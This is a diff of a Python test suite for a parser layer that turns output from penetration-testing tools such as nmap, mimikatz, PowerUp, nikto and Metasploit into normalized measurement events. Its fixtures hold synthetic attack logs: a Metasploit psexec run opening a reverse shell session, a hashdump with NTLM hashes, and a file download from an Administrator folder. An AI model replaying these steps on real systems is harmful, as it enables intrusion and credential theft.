@@ -2,8 +2,13 @@
 Tests for M1 — Tool Output Normalization Layer
 invar/adapters/measurement/tool_normalizer.py
 
-Each test class covers one instrument parser plus the MeasurementAdapter
-integration.  No tools are executed; all inputs are synthetic output strings.
+Architecture under test (Section 3, INVAR Research Paper v2.28):
+    MeasurementEvent  — frozen canonical event (source/node_key/gate_id/...)
+    ToolNormalizer    — instrument parser protocol
+    NormalizerRegistry — first-match ordered dispatch
+    MeasurementAdapter — orchestration + Pearl emission
+
+All inputs are synthetic; no real tools are executed.
 """
 from __future__ import annotations
 import time
@@ -12,14 +17,35 @@ import pytest
 from invar.adapters.measurement.tool_normalizer import (
     MeasurementAdapter,
     MeasurementEvent,
-    parse_nmap,
-    parse_mimikatz,
-    parse_enum4linux,
-    parse_powerup,
-    parse_nikto,
+    NmapNormalizer,
+    MimikatzNormalizer,
+    Enum4linuxNormalizer,
+    PowerUpNormalizer,
+    NiktoNormalizer,
+    MetasploitNormalizer,
+    NormalizerRegistry,
+    _raw_ref,
 )
 from invar.core.gate import GateState
 from invar.persistence.pearl_archive import PearlArchive
+
+
+# ===========================================================================
+# Shared context helper
+# ===========================================================================
+
+def _ctx(
+    workload_id: str = "eng-01",
+    node_key: str = "192.168.1.50",
+    cycle_id: str = "cycle-01",
+    timestamp: float = 1_000_000.0,
+) -> dict:
+    return {
+        "workload_id": workload_id,
+        "node_key": node_key,
+        "cycle_id": cycle_id,
+        "timestamp": timestamp,
+    }
 
 
 # ===========================================================================
@@ -136,12 +162,12 @@ Password ......... ''
  =============================
 |    Share Enumeration on 192.168.1.50    |
  =============================
-	Sharename       Type      Comment
-	---------       ----      -------
-	ADMIN$          Disk      Remote Admin
-	C$              Disk      Default share
-	IPC$            IPC       Remote IPC
-	Users           Disk
+\tSharename       Type      Comment
+\t---------       ----      -------
+\tADMIN$          Disk      Remote Admin
+\tC$              Disk      Default share
+\tIPC$            IPC       Remote IPC
+\tUsers           Disk
 
  ======================================
 |    Users on 192.168.1.50 via RID cycling (RIDS: 500-550,1000-1050)    |
@@ -199,256 +225,482 @@ NIKTO_OUTPUT = """\
 + Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST
 + OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST"""
 
+MSF_PSEXEC = """\
+[*] Started reverse TCP handler on 10.10.10.1:4444
+[*] Connecting to the server...
+[*] Authenticating to 192.168.1.50:445 as user 'Administrator'...
+[*] Selecting PowerShell target
+[*] Executing the payload...
+[+] 192.168.1.50:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (200774 bytes) to 192.168.1.50
+[*] Meterpreter session 1 opened (10.10.10.1:4444 -> 192.168.1.50:49712)
+msf exploit(psexec) > sessions -l"""
 
-# ===========================================================================
-# nmap parser
-# ===========================================================================
-
-class TestNmapParser:
-
-    def test_nmap_host_up(self):
-        events = parse_nmap(NMAP_XML_BASIC)
-        gate_ids = [e.gate_id for e in events]
-        assert "discover_nmap_host" in gate_ids
-
-    def test_nmap_smb_port(self):
-        events = parse_nmap(NMAP_XML_BASIC)
-        gate_ids = [e.gate_id for e in events]
-        assert "discover_nmap_smb" in gate_ids
-
-    def test_nmap_http_port(self):
-        events = parse_nmap(NMAP_XML_BASIC)
-        gate_ids = [e.gate_id for e in events]
-        assert "discover_nmap_http" in gate_ids
-
-    def test_nmap_ssh_port(self):
-        events = parse_nmap(NMAP_XML_BASIC)
-        gate_ids = [e.gate_id for e in events]
-        assert "discover_nmap_ssh" in gate_ids
-
-    def test_nmap_os(self):
-        events = parse_nmap(NMAP_XML_BASIC)
-        gate_ids = [e.gate_id for e in events]
-        assert "discover_nmap_os" in gate_ids
-
-    def test_nmap_target_from_xml(self):
-        events = parse_nmap(NMAP_XML_BASIC)
-        for e in events:
-            assert e.target == "192.168.1.50"
-
-    def test_nmap_closed_host_no_events(self):
-        events = parse_nmap(NMAP_XML_CLOSED)
-        assert events == []
-
-    def test_nmap_multi_host(self):
-        events = parse_nmap(NMAP_XML_MULTI_HOST)
-        targets = {e.target for e in events}
-        assert "10.0.0.1" in targets
-        assert "10.0.0.2" in targets
-
-    def test_nmap_rdp(self):
-        events = parse_nmap(NMAP_XML_MULTI_HOST)
-        gate_ids = [e.gate_id for e in events]
-        assert "discover_nmap_rdp" in gate_ids
-
-    def test_nmap_https(self):
-        events = parse_nmap(NMAP_XML_MULTI_HOST)
-        gate_ids = [e.gate_id for e in events]
-        assert "discover_nmap_https" in gate_ids
-
-    def test_nmap_malformed_xml(self):
-        events = parse_nmap("<not valid<<<")
-        assert events == []
-
-    def test_nmap_tool_label(self):
-        events = parse_nmap(NMAP_XML_BASIC)
-        for e in events:
-            assert e.tool == "nmap"
-
-    def test_nmap_deterministic(self):
-        t = 1_000_000.0
-        assert parse_nmap(NMAP_XML_BASIC, ts=t) == parse_nmap(NMAP_XML_BASIC, ts=t)
+MSF_HASHDUMP = """\
+meterpreter > run post/multi/recon/local_exploit_suggester
+[*] 192.168.1.50 - Collecting local exploits for x86/windows...
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+meterpreter > download C:\\\\Users\\\\Administrator\\\\Documents\\\\secret.txt"""
 
 
 # ===========================================================================
-# mimikatz parser
+# MeasurementEvent schema
 # ===========================================================================
 
-class TestMimikatzParser:
+class TestMeasurementEvent:
 
-    def test_mimi_logonpw(self):
-        events = parse_mimikatz(MIMIKATZ_SEKURLSA, target="192.168.1.50")
-        gate_ids = [e.gate_id for e in events]
-        assert "cred_mimikatz_logonpw" in gate_ids
-
-    def test_mimi_ntlm_hash(self):
-        events = parse_mimikatz(MIMIKATZ_SEKURLSA, target="192.168.1.50")
-        gate_ids = [e.gate_id for e in events]
-        assert "cred_hash_ntlm" in gate_ids
-
-    def test_mimi_dcsync(self):
-        events = parse_mimikatz(MIMIKATZ_DCSYNC, target="DC01")
-        gate_ids = [e.gate_id for e in events]
-        assert "cred_mimikatz_dcsync" in gate_ids
-
-    def test_mimi_dcsync_ntlm(self):
-        events = parse_mimikatz(MIMIKATZ_DCSYNC, target="DC01")
-        gate_ids = [e.gate_id for e in events]
-        assert "cred_hash_ntlm" in gate_ids
-
-    def test_mimi_deduplication(self):
-        """Same gate_id for same target appears only once."""
-        doubled = MIMIKATZ_DCSYNC + "\n" + MIMIKATZ_DCSYNC
-        events = parse_mimikatz(doubled, target="DC01")
-        gate_ids = [e.gate_id for e in events]
-        assert gate_ids.count("cred_mimikatz_dcsync") == 1
-
-    def test_mimi_target_preserved(self):
-        events = parse_mimikatz(MIMIKATZ_SEKURLSA, target="WORKSTATION1")
-        for e in events:
-            assert e.target == "WORKSTATION1"
-
-    def test_mimi_empty_text(self):
-        events = parse_mimikatz("", target="host")
-        assert events == []
-
-    def test_mimi_tool_label(self):
-        events = parse_mimikatz(MIMIKATZ_SEKURLSA)
-        for e in events:
-            assert e.tool == "mimikatz"
-
-    def test_mimi_deterministic(self):
-        t = 1_000_000.0
-        assert parse_mimikatz(MIMIKATZ_SEKURLSA, ts=t) == parse_mimikatz(MIMIKATZ_SEKURLSA, ts=t)
-
-
-# ===========================================================================
-# enum4linux parser
-# ===========================================================================
-
-class TestEnum4linuxParser:
-
-    def test_e4l_shares(self):
-        events = parse_enum4linux(ENUM4LINUX_OUTPUT, target="192.168.1.50")
-        gate_ids = [e.gate_id for e in events]
-        assert "discover_smb_shares" in gate_ids
-
-    def test_e4l_users(self):
-        events = parse_enum4linux(ENUM4LINUX_OUTPUT, target="192.168.1.50")
-        gate_ids = [e.gate_id for e in events]
-        assert "discover_smb_users" in gate_ids
-
-    def test_e4l_groups(self):
-        events = parse_enum4linux(ENUM4LINUX_OUTPUT, target="192.168.1.50")
-        gate_ids = [e.gate_id for e in events]
-        assert "discover_smb_groups" in gate_ids
-
-    def test_e4l_deduplication(self):
-        events = parse_enum4linux(ENUM4LINUX_OUTPUT, target="192.168.1.50")
-        gate_ids = [e.gate_id for e in events]
-        assert gate_ids.count("discover_smb_shares") == 1
-
-    def test_e4l_tool_label(self):
-        events = parse_enum4linux(ENUM4LINUX_OUTPUT)
-        for e in events:
-            assert e.tool == "enum4linux"
-
-    def test_e4l_empty_text(self):
-        events = parse_enum4linux("")
-        assert events == []
-
-    def test_e4l_deterministic(self):
-        t = 1_000_000.0
-        assert (
-            parse_enum4linux(ENUM4LINUX_OUTPUT, ts=t)
-            == parse_enum4linux(ENUM4LINUX_OUTPUT, ts=t)
+    def test_frozen(self):
+        ev = MeasurementEvent(
+            timestamp=1.0, source="nmap", node_key="host",
+            workload_id="w1", cycle_id="c1", gate_id="discover_nmap_host", raw_ref=None,
         )
+        with pytest.raises((AttributeError, TypeError)):
+            ev.gate_id = "something_else"  # type: ignore[misc]
+
+    def test_field_names(self):
+        ev = MeasurementEvent(
+            timestamp=1_000_000.0, source="mimikatz", node_key="DC01",
+            workload_id="eng-01", cycle_id="cycle-03", gate_id="cred_mimikatz_logonpw",
+            raw_ref="abc123",
+        )
+        assert ev.timestamp == 1_000_000.0
+        assert ev.source == "mimikatz"
+        assert ev.node_key == "DC01"
+        assert ev.workload_id == "eng-01"
+        assert ev.cycle_id == "cycle-03"
+        assert ev.gate_id == "cred_mimikatz_logonpw"
+        assert ev.raw_ref == "abc123"
+
+    def test_raw_ref_hash(self):
+        ref = _raw_ref("some fragment")
+        assert len(ref) == 16
+        assert ref == _raw_ref("some fragment")  # deterministic
+
+    def test_raw_ref_different_inputs(self):
+        assert _raw_ref("abc") != _raw_ref("xyz")
+
+    def test_raw_ref_none_allowed(self):
+        ev = MeasurementEvent(
+            timestamp=1.0, source="nmap", node_key="h",
+            workload_id="w", cycle_id="c", gate_id="discover_nmap_host", raw_ref=None,
+        )
+        assert ev.raw_ref is None
 
 
 # ===========================================================================
-# PowerUp parser
+# NmapNormalizer
 # ===========================================================================
 
-class TestPowerUpParser:
+class TestNmapNormalizer:
 
-    def test_pu_unquoted(self):
-        events = parse_powerup(POWERUP_OUTPUT, target="WORKSTATION1")
+    def _parse(self, xml: str, **ctx_kwargs) -> list:
+        ctx = _ctx(**ctx_kwargs)
+        return NmapNormalizer().parse(xml, ctx)
+
+    def test_host_up(self):
+        events = self._parse(NMAP_XML_BASIC)
+        assert any(e.gate_id == "discover_nmap_host" for e in events)
+
+    def test_smb_port_445(self):
+        events = self._parse(NMAP_XML_BASIC)
         gate_ids = [e.gate_id for e in events]
-        assert "persist_svc_unquoted" in gate_ids
+        # port 445 maps to discover_nmap_445 — NOT discover_nmap_smb (lateral collision avoidance)
+        assert "discover_nmap_445" in gate_ids
+        assert "discover_nmap_smb" not in gate_ids
 
-    def test_pu_modifiable(self):
-        events = parse_powerup(POWERUP_OUTPUT, target="WORKSTATION1")
+    def test_http_port(self):
+        events = self._parse(NMAP_XML_BASIC)
+        assert any(e.gate_id == "discover_nmap_http" for e in events)
+
+    def test_ssh_port(self):
+        events = self._parse(NMAP_XML_BASIC)
+        assert any(e.gate_id == "discover_nmap_ssh" for e in events)
+
+    def test_os_detection(self):
+        events = self._parse(NMAP_XML_BASIC)
+        assert any(e.gate_id == "discover_nmap_os" for e in events)
+
+    def test_node_key_from_xml(self):
+        events = self._parse(NMAP_XML_BASIC, node_key="fallback-host")
+        # nmap reads the actual IP from XML, overriding context fallback
+        for e in events:
+            assert e.node_key == "192.168.1.50"
+
+    def test_closed_host_no_events(self):
+        assert self._parse(NMAP_XML_CLOSED) == []
+
+    def test_multi_host_both_ips(self):
+        events = self._parse(NMAP_XML_MULTI_HOST)
+        ips = {e.node_key for e in events}
+        assert "10.0.0.1" in ips
+        assert "10.0.0.2" in ips
+
+    def test_rdp_port(self):
+        events = self._parse(NMAP_XML_MULTI_HOST)
+        assert any(e.gate_id == "discover_nmap_rdp" for e in events)
+
+    def test_https_port(self):
+        events = self._parse(NMAP_XML_MULTI_HOST)
+        assert any(e.gate_id == "discover_nmap_https" for e in events)
+
+    def test_malformed_xml(self):
+        assert self._parse("<not valid<<<") == []
+
+    def test_source_field(self):
+        events = self._parse(NMAP_XML_BASIC)
+        assert all(e.source == "nmap" for e in events)
+
+    def test_deterministic(self):
+        ctx = _ctx(timestamp=1_000_000.0)
+        n = NmapNormalizer()
+        assert n.parse(NMAP_XML_BASIC, ctx) == n.parse(NMAP_XML_BASIC, ctx)
+
+    def test_raw_ref_present(self):
+        events = self._parse(NMAP_XML_BASIC)
+        for e in events:
+            assert e.raw_ref is not None
+            assert len(e.raw_ref) == 16
+
+    def test_workload_and_cycle_propagated(self):
+        ctx = _ctx(workload_id="eng-99", cycle_id="recon-01")
+        events = NmapNormalizer().parse(NMAP_XML_BASIC, ctx)
+        for e in events:
+            assert e.workload_id == "eng-99"
+            assert e.cycle_id == "recon-01"
+
+    def test_all_gate_ids_discover_prefix(self):
+        events = self._parse(NMAP_XML_BASIC)
+        assert all(e.gate_id.startswith("discover_") for e in events)
+
+
+# ===========================================================================
+# MimikatzNormalizer
+# ===========================================================================
+
+class TestMimikatzNormalizer:
+
+    def _parse(self, text: str, **ctx_kwargs) -> list:
+        ctx = _ctx(**ctx_kwargs)
+        return MimikatzNormalizer().parse(text, ctx)
+
+    def test_logonpasswords(self):
+        events = self._parse(MIMIKATZ_SEKURLSA)
+        assert any(e.gate_id == "cred_mimikatz_logonpw" for e in events)
+
+    def test_ntlm_hash(self):
+        events = self._parse(MIMIKATZ_SEKURLSA)
+        assert any(e.gate_id == "cred_hash_ntlm" for e in events)
+
+    def test_dcsync(self):
+        events = self._parse(MIMIKATZ_DCSYNC, node_key="DC01")
+        assert any(e.gate_id == "cred_mimikatz_dcsync" for e in events)
+
+    def test_dcsync_ntlm(self):
+        events = self._parse(MIMIKATZ_DCSYNC, node_key="DC01")
+        assert any(e.gate_id == "cred_hash_ntlm" for e in events)
+
+    def test_deduplication_same_gate_same_node(self):
+        doubled = MIMIKATZ_DCSYNC + "\n" + MIMIKATZ_DCSYNC
+        events = self._parse(doubled, node_key="DC01")
+        assert [e.gate_id for e in events].count("cred_mimikatz_dcsync") == 1
+
+    def test_node_key_from_context(self):
+        events = self._parse(MIMIKATZ_SEKURLSA, node_key="WORKSTATION1")
+        assert all(e.node_key == "WORKSTATION1" for e in events)
+
+    def test_empty_text(self):
+        assert self._parse("") == []
+
+    def test_source_field(self):
+        events = self._parse(MIMIKATZ_SEKURLSA)
+        assert all(e.source == "mimikatz" for e in events)
+
+    def test_deterministic(self):
+        ctx = _ctx(timestamp=1_000_000.0)
+        n = MimikatzNormalizer()
+        assert n.parse(MIMIKATZ_SEKURLSA, ctx) == n.parse(MIMIKATZ_SEKURLSA, ctx)
+
+    def test_all_gate_ids_cred_prefix(self):
+        events = self._parse(MIMIKATZ_SEKURLSA)
+        assert all(e.gate_id.startswith("cred_") for e in events)
+
+
+# ===========================================================================
+# Enum4linuxNormalizer
+# ===========================================================================
+
+class TestEnum4linuxNormalizer:
+
+    def _parse(self, text: str, **ctx_kwargs) -> list:
+        ctx = _ctx(**ctx_kwargs)
+        return Enum4linuxNormalizer().parse(text, ctx)
+
+    def test_shares(self):
+        events = self._parse(ENUM4LINUX_OUTPUT)
+        assert any(e.gate_id == "discover_shares" for e in events)
+
+    def test_no_smb_collision(self):
+        events = self._parse(ENUM4LINUX_OUTPUT)
         gate_ids = [e.gate_id for e in events]
-        assert "persist_svc_modifiable" in gate_ids
+        # old gate_ids with "smb" substring must not appear
+        assert "discover_smb_shares" not in gate_ids
+        assert "discover_smb_users" not in gate_ids
+        assert "discover_smb_groups" not in gate_ids
 
-    def test_pu_autorun(self):
-        events = parse_powerup(POWERUP_OUTPUT, target="WORKSTATION1")
-        gate_ids = [e.gate_id for e in events]
-        assert "persist_autorun" in gate_ids
+    def test_users(self):
+        events = self._parse(ENUM4LINUX_OUTPUT)
+        assert any(e.gate_id == "discover_users" for e in events)
 
-    def test_pu_dll_hijack(self):
-        events = parse_powerup(POWERUP_OUTPUT, target="WORKSTATION1")
-        gate_ids = [e.gate_id for e in events]
-        assert "persist_dll_hijack" in gate_ids
+    def test_groups(self):
+        events = self._parse(ENUM4LINUX_OUTPUT)
+        assert any(e.gate_id == "discover_groups" for e in events)
 
-    def test_pu_checks(self):
-        events = parse_powerup(POWERUP_OUTPUT, target="WORKSTATION1")
-        gate_ids = [e.gate_id for e in events]
-        assert "persist_checks" in gate_ids
+    def test_deduplication(self):
+        events = self._parse(ENUM4LINUX_OUTPUT)
+        assert [e.gate_id for e in events].count("discover_shares") == 1
 
-    def test_pu_deduplication(self):
+    def test_source_field(self):
+        events = self._parse(ENUM4LINUX_OUTPUT)
+        assert all(e.source == "enum4linux" for e in events)
+
+    def test_empty_text(self):
+        assert self._parse("") == []
+
+    def test_deterministic(self):
+        ctx = _ctx(timestamp=1_000_000.0)
+        n = Enum4linuxNormalizer()
+        assert n.parse(ENUM4LINUX_OUTPUT, ctx) == n.parse(ENUM4LINUX_OUTPUT, ctx)
+
+    def test_all_gate_ids_discover_prefix(self):
+        events = self._parse(ENUM4LINUX_OUTPUT)
+        assert all(e.gate_id.startswith("discover_") for e in events)
+
+
+# ===========================================================================
+# PowerUpNormalizer
+# ===========================================================================
+
+class TestPowerUpNormalizer:
+
+    def _parse(self, text: str, **ctx_kwargs) -> list:
+        ctx = _ctx(**ctx_kwargs)
+        return PowerUpNormalizer().parse(text, ctx)
+
+    def test_unquoted_service(self):
+        events = self._parse(POWERUP_OUTPUT)
+        assert any(e.gate_id == "persist_svc_unquoted" for e in events)
+
+    def test_modifiable_service(self):
+        events = self._parse(POWERUP_OUTPUT)
+        assert any(e.gate_id == "persist_svc_modifiable" for e in events)
+
+    def test_autorun(self):
+        events = self._parse(POWERUP_OUTPUT)
+        assert any(e.gate_id == "persist_autorun" for e in events)
+
+    def test_dll_hijack(self):
+        events = self._parse(POWERUP_OUTPUT)
+        assert any(e.gate_id == "persist_dll_hijack" for e in events)
+
+    def test_checks(self):
+        events = self._parse(POWERUP_OUTPUT)
+        assert any(e.gate_id == "persist_checks" for e in events)
+
+    def test_deduplication(self):
         doubled = POWERUP_OUTPUT + "\n" + POWERUP_OUTPUT
-        events = parse_powerup(doubled, target="host")
-        gate_ids = [e.gate_id for e in events]
-        assert gate_ids.count("persist_svc_unquoted") == 1
+        events = self._parse(doubled)
+        assert [e.gate_id for e in events].count("persist_svc_unquoted") == 1
 
-    def test_pu_tool_label(self):
-        events = parse_powerup(POWERUP_OUTPUT)
-        for e in events:
-            assert e.tool == "powerup"
+    def test_source_field(self):
+        events = self._parse(POWERUP_OUTPUT)
+        assert all(e.source == "powerup" for e in events)
 
-    def test_pu_empty_text(self):
-        events = parse_powerup("")
-        assert events == []
+    def test_powershell_alias(self):
+        ctx = _ctx()
+        n = PowerUpNormalizer()
+        assert n.supports("powershell")
+        assert n.supports("powerup")
 
-    def test_pu_deterministic(self):
-        t = 1_000_000.0
-        assert parse_powerup(POWERUP_OUTPUT, ts=t) == parse_powerup(POWERUP_OUTPUT, ts=t)
+    def test_empty_text(self):
+        assert self._parse("") == []
+
+    def test_deterministic(self):
+        ctx = _ctx(timestamp=1_000_000.0)
+        n = PowerUpNormalizer()
+        assert n.parse(POWERUP_OUTPUT, ctx) == n.parse(POWERUP_OUTPUT, ctx)
+
+    def test_all_gate_ids_persist_prefix(self):
+        events = self._parse(POWERUP_OUTPUT)
+        assert all(e.gate_id.startswith("persist_") for e in events)
 
 
 # ===========================================================================
-# nikto parser
+# NiktoNormalizer
 # ===========================================================================
 
-class TestNiktoParser:
+class TestNiktoNormalizer:
 
-    def test_nikto_vuln(self):
-        events = parse_nikto(NIKTO_OUTPUT, target="192.168.1.50")
-        gate_ids = [e.gate_id for e in events]
-        assert "discover_nikto_vuln" in gate_ids
+    def _parse(self, text: str, **ctx_kwargs) -> list:
+        ctx = _ctx(**ctx_kwargs)
+        return NiktoNormalizer().parse(text, ctx)
 
-    def test_nikto_server(self):
-        events = parse_nikto(NIKTO_OUTPUT, target="192.168.1.50")
-        gate_ids = [e.gate_id for e in events]
-        assert "discover_web_server" in gate_ids
+    def test_vuln(self):
+        events = self._parse(NIKTO_OUTPUT)
+        assert any(e.gate_id == "discover_nikto_vuln" for e in events)
 
-    def test_nikto_web_dir(self):
-        events = parse_nikto(NIKTO_OUTPUT, target="192.168.1.50")
-        gate_ids = [e.gate_id for e in events]
-        assert "discover_web_dir" in gate_ids
+    def test_server(self):
+        events = self._parse(NIKTO_OUTPUT)
+        assert any(e.gate_id == "discover_web_server" for e in events)
 
-    def test_nikto_tool_label(self):
-        events = parse_nikto(NIKTO_OUTPUT)
-        for e in events:
-            assert e.tool == "nikto"
+    def test_web_dir(self):
+        events = self._parse(NIKTO_OUTPUT)
+        assert any(e.gate_id == "discover_web_dir" for e in events)
 
-    def test_nikto_empty_text(self):
-        events = parse_nikto("")
-        assert events == []
+    def test_source_field(self):
+        events = self._parse(NIKTO_OUTPUT)
+        assert all(e.source == "nikto" for e in events)
 
-    def test_nikto_deterministic(self):
-        t = 1_000_000.0
-        assert parse_nikto(NIKTO_OUTPUT, ts=t) == parse_nikto(NIKTO_OUTPUT, ts=t)
+    def test_empty_text(self):
+        assert self._parse("") == []
+
+    def test_deterministic(self):
+        ctx = _ctx(timestamp=1_000_000.0)
+        n = NiktoNormalizer()
+        assert n.parse(NIKTO_OUTPUT, ctx) == n.parse(NIKTO_OUTPUT, ctx)
+
+    def test_all_gate_ids_discover_prefix(self):
+        events = self._parse(NIKTO_OUTPUT)
+        assert all(e.gate_id.startswith("discover_") for e in events)
+
+
+# ===========================================================================
+# MetasploitNormalizer
+# ===========================================================================
+
+class TestMetasploitNormalizer:
+
+    def _parse(self, text: str, **ctx_kwargs) -> list:
+        ctx = _ctx(**ctx_kwargs)
+        return MetasploitNormalizer().parse(text, ctx)
+
+    def test_psexec_lateral(self):
+        events = self._parse(MSF_PSEXEC)
+        assert any(e.gate_id == "lateral_msf_psexec" for e in events)
+
+    def test_meterpreter_session(self):
+        events = self._parse(MSF_PSEXEC)
+        assert any(e.gate_id == "exec_msf_session" for e in events)
+
+    def test_hashdump_cred(self):
+        events = self._parse(MSF_HASHDUMP)
+        assert any(e.gate_id == "cred_msf_capture" for e in events)
+
+    def test_post_module(self):
+        events = self._parse(MSF_HASHDUMP)
+        assert any(e.gate_id == "exec_msf_module" for e in events)
+
+    def test_download_loot(self):
+        events = self._parse(MSF_HASHDUMP)
+        assert any(e.gate_id == "collect_msf_loot" for e in events)
+
+    def test_source_field(self):
+        events = self._parse(MSF_PSEXEC)
+        assert all(e.source == "msf" for e in events)
+
+    def test_metasploit_alias(self):
+        n = MetasploitNormalizer()
+        assert n.supports("msf")
+        assert n.supports("metasploit")
+
+    def test_empty_text(self):
+        assert self._parse("") == []
+
+    def test_deduplication(self):
+        doubled = MSF_PSEXEC + "\n" + MSF_PSEXEC
+        events = self._parse(doubled)
+        assert [e.gate_id for e in events].count("lateral_msf_psexec") == 1
+
+    def test_deterministic(self):
+        ctx = _ctx(timestamp=1_000_000.0)
+        n = MetasploitNormalizer()
+        assert n.parse(MSF_PSEXEC, ctx) == n.parse(MSF_PSEXEC, ctx)
+
+
+# ===========================================================================
+# NormalizerRegistry
+# ===========================================================================
+
+class TestNormalizerRegistry:
+
+    def test_default_registers_all_six(self):
+        reg = NormalizerRegistry.default()
+        sources = ["nmap", "mimikatz", "enum4linux", "powerup", "nikto", "msf"]
+        ctx = _ctx()
+        for src in sources:
+            # just verify dispatch doesn't raise and returns a list
+            result = reg.parse(src, "", ctx)
+            assert isinstance(result, list)
+
+    def test_unknown_source_returns_empty(self):
+        reg = NormalizerRegistry.default()
+        result = reg.parse("unknown_tool_xyz", "some output", _ctx())
+        assert result == []
+
+    def test_first_match_dispatch_nmap(self):
+        reg = NormalizerRegistry.default()
+        events = reg.parse("nmap", NMAP_XML_BASIC, _ctx())
+        assert any(e.gate_id == "discover_nmap_host" for e in events)
+
+    def test_first_match_dispatch_mimikatz(self):
+        reg = NormalizerRegistry.default()
+        events = reg.parse("mimikatz", MIMIKATZ_SEKURLSA, _ctx())
+        assert any(e.gate_id == "cred_mimikatz_logonpw" for e in events)
+
+    def test_first_match_dispatch_msf(self):
+        reg = NormalizerRegistry.default()
+        events = reg.parse("msf", MSF_PSEXEC, _ctx())
+        assert any(e.gate_id == "lateral_msf_psexec" for e in events)
+
+    def test_metasploit_alias_dispatch(self):
+        reg = NormalizerRegistry.default()
+        events = reg.parse("metasploit", MSF_PSEXEC, _ctx())
+        assert any(e.gate_id == "lateral_msf_psexec" for e in events)
+
+    def test_powershell_alias_dispatch(self):
+        reg = NormalizerRegistry.default()
+        events = reg.parse("powershell", POWERUP_OUTPUT, _ctx())
+        assert any(e.gate_id.startswith("persist_") for e in events)
+
+    def test_normalizer_exception_returns_empty(self):
+        """Registry swallows exceptions from normalizers."""
+        class BrokenNormalizer:
+            def supports(self, source): return source == "broken"
+            def parse(self, raw, ctx): raise RuntimeError("kaboom")
+        reg = NormalizerRegistry()
+        reg._normalizers.append(BrokenNormalizer())
+        assert reg.parse("broken", "any", _ctx()) == []
+
+    def test_register_custom_normalizer(self):
+        from invar.adapters.measurement.tool_normalizer import ToolNormalizer
+
+        class AlwaysOneNormalizer(ToolNormalizer):
+            def source_name(self): return "custom"
+            def supports(self, source): return source == "custom"
+            def parse(self, raw, ctx):
+                return [self._event("discover_custom_test", ctx, "frag")]
+
+        reg = NormalizerRegistry()
+        reg.register(AlwaysOneNormalizer())
+        events = reg.parse("custom", "anything", _ctx())
+        assert len(events) == 1
+        assert events[0].gate_id == "discover_custom_test"
+
+    def test_returns_list_not_exception_on_empty_source(self):
+        reg = NormalizerRegistry.default()
+        result = reg.parse("nmap", "", _ctx())
+        assert isinstance(result, list)
 
 
 # ===========================================================================
@@ -465,31 +717,34 @@ class TestMeasurementAdapter:
 
     def test_ingest_mimikatz_cred_pearls(self):
         adapter = MeasurementAdapter("eng-01", node_key="TARGET-HP")
-        pearls = adapter.ingest_mimikatz(MIMIKATZ_SEKURLSA, cycle_id="c03", target="TARGET-HP")
-        gate_ids = [p.gate_id for p in pearls]
-        assert any("cred_" in g for g in gate_ids)
+        pearls = adapter.ingest_mimikatz(MIMIKATZ_SEKURLSA, cycle_id="c03")
+        assert any("cred_" in p.gate_id for p in pearls)
 
-    def test_ingest_enum4linux_pearls(self):
+    def test_ingest_enum4linux_discover_shares(self):
         adapter = MeasurementAdapter("eng-01", node_key="TARGET-HP")
         pearls = adapter.ingest_enum4linux(ENUM4LINUX_OUTPUT, cycle_id="c02")
         gate_ids = [p.gate_id for p in pearls]
-        assert "discover_smb_shares" in gate_ids
+        assert "discover_shares" in gate_ids
+        assert "discover_smb_shares" not in gate_ids
 
     def test_ingest_powerup_pearls(self):
         adapter = MeasurementAdapter("eng-01", node_key="TARGET-HP")
         pearls = adapter.ingest_powerup(POWERUP_OUTPUT, cycle_id="c04")
-        gate_ids = [p.gate_id for p in pearls]
-        assert any("persist_" in g for g in gate_ids)
+        assert any("persist_" in p.gate_id for p in pearls)
 
     def test_ingest_nikto_pearls(self):
         adapter = MeasurementAdapter("eng-01", node_key="TARGET-HP")
         pearls = adapter.ingest_nikto(NIKTO_OUTPUT, cycle_id="c05")
-        gate_ids = [p.gate_id for p in pearls]
-        assert "discover_nikto_vuln" in gate_ids
+        assert any(p.gate_id == "discover_nikto_vuln" for p in pearls)
+
+    def test_ingest_msf_pearls(self):
+        adapter = MeasurementAdapter("eng-01", node_key="TARGET-HP")
+        pearls = adapter.ingest_msf(MSF_PSEXEC, cycle_id="c06")
+        assert any(p.gate_id == "lateral_msf_psexec" for p in pearls)
 
     def test_pearl_fields_correct(self):
         adapter = MeasurementAdapter("eng-42", node_key="HP-WIN11")
-        pearls = adapter.ingest_nmap(NMAP_XML_BASIC, cycle_id="recon-01")
+        pearls = adapter.ingest_mimikatz(MIMIKATZ_SEKURLSA, cycle_id="recon-01")
         p = pearls[0]
         assert p.workload_id == "eng-42"
         assert p.node_key == "HP-WIN11"
@@ -502,8 +757,12 @@ class TestMeasurementAdapter:
     def test_instrument_id_contains_tool(self):
         adapter = MeasurementAdapter("eng-01", node_key="HOST")
         pearls = adapter.ingest_mimikatz(MIMIKATZ_DCSYNC, cycle_id="c03")
-        for p in pearls:
-            assert "mimikatz" in p.instrument_id
+        assert all("mimikatz" in p.instrument_id for p in pearls)
+
+    def test_instrument_id_nmap(self):
+        adapter = MeasurementAdapter("eng-01", node_key="HOST")
+        pearls = adapter.ingest_nmap(NMAP_XML_BASIC, cycle_id="c01")
+        assert all("nmap" in p.instrument_id for p in pearls)
 
     def test_seq_id_monotone_across_tools(self):
         adapter = MeasurementAdapter("eng-01", node_key="HOST")
@@ -517,8 +776,7 @@ class TestMeasurementAdapter:
         adapter = MeasurementAdapter("eng-01", node_key="HOST")
         adapter.ingest_nmap(NMAP_XML_BASIC, cycle_id="c01")
         adapter.ingest_mimikatz(MIMIKATZ_DCSYNC, cycle_id="c03")
-        all_p = adapter.pearls()
-        assert len(all_p) > 1
+        assert len(adapter.pearls()) > 1
 
     def test_snapshot(self):
         adapter = MeasurementAdapter("eng-01", node_key="HOST")
@@ -530,9 +788,8 @@ class TestMeasurementAdapter:
 
     def test_cycle_override(self):
         adapter = MeasurementAdapter("eng-01", node_key="HOST")
-        pearls = adapter.ingest_nmap(NMAP_XML_BASIC, cycle_id="operator-recon")
-        for p in pearls:
-            assert p.cycle_id == "operator-recon"
+        pearls = adapter.ingest_mimikatz(MIMIKATZ_SEKURLSA, cycle_id="operator-recon")
+        assert all(p.cycle_id == "operator-recon" for p in pearls)
 
